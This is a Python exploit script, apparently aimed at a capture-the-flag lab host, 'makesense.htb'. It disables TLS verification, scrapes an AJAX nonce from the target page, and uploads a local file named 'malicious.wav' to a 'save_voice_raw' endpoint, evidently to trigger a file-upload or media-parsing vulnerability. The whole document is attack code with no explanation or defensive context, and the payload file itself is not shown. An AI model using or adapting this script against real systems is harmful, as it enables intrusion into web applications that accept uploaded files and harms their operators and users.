import urllib.request
import json
import ssl
import re

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

req = urllib.request.Request('https://makesense.htb/', headers={'User-Agent': 'Mozilla/5.0'})
html = urllib.request.urlopen(req, context=ctx).read().decode('utf-8')
match = re.search(r'var webagency_ajax = (\{.*?\});', html)
config = json.loads(match.group(1))
nonce = config['nonce']
ajax_url = config['ajax_url']

def post_multipart(url, fields, files):
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    body = bytearray()
    for k, v in fields.items():
        body.extend(f'--{boundary}\r\n'.encode('utf-8'))
        body.extend(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode('utf-8'))
        body.extend(f'{v}\r\n'.encode('utf-8'))
    for k, (filename, content, content_type) in files.items():
        body.extend(f'--{boundary}\r\n'.encode('utf-8'))
        body.extend(f'Content-Disposition: form-data; name="{k}"; filename="{filename}"\r\n'.encode('utf-8'))
        body.extend(f'Content-Type: {content_type}\r\n\r\n'.encode('utf-8'))
        body.extend(content)
        body.extend(b'\r\n')
    body.extend(f'--{boundary}--\r\n'.encode('utf-8'))
    
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': f'multipart/form-data; boundary={boundary}'
    }
    req = urllib.request.Request(url, data=bytes(body), headers=headers)
    return urllib.request.urlopen(req, context=ctx).read().decode('utf-8')

with open('malicious.wav', 'rb') as f:
    wav_content = f.read()

fields = {'action': 'save_voice_raw', 'nonce': nonce}
files = {'voice_recording': ('malicious_meta.wav', wav_content, 'audio/wav')}
res = post_multipart(ajax_url, fields, files)
print("Upload result:", res)
